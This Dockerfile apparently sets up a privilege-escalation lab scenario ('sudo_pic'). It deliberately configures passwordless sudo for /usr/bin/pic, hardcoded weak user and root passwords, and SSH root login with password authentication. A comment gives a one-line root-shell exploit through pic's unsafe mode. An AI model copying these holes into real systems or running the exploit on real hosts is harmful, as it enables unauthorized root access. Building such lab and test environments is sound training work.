FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_pic
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/pic as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and groff (which provides pic)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        groff \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify pic is installed
RUN which pic && ls -la /usr/bin/pic

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# pic with -U flag enables unsafe mode which allows shell command execution.
# The exploit:
#   printf '.PS\nsh X sh X\n' | sudo pic -U
# This spawns a root shell via pic's shell escape functionality.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/pic" > /etc/sudoers.d/pic && \
    chmod 440 /etc/sudoers.d/pic

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]